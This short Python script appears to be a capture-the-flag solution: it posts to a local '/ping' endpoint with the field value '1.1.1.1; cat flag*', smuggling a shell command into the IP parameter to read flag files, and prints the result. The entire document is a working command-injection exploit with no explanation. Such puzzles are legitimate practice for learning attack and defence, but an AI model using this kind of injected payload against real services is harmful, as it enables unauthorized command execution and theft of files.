from requests import post
print(post('http://localhost:1337/ping', json={'ip': '1.1.1.1; cat flag*'}).json()['result'].split('\n')[-1])
